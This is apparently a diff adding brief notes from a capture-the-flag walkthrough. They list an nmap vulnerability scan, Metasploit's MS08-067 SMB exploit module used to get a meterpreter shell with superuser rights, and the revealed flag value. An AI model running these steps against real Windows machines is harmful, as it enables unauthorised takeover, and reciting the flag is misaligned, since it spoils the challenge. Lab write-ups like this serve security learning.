@@ -1,0 +1,26 @@
+1) ran the command to identify the ports of the machine 
+
+nmap -sC -T4 --script vuln <IP>
+
+2) used msfconsole and scearch for MS08-067 exploit
+
+search ms 08-067
+
+3) used the exploit
+
+command--> use exploit/windows/smb/ms08_067_netapi  2008-10-28
+
+set the rhost.
+
+run.
+
+got the meterpreter shell
+
+and you  are the super user.
+
+4) we got the flag 2 at C:\
+
+"batman"
+
+
+I guess D drive unmounted
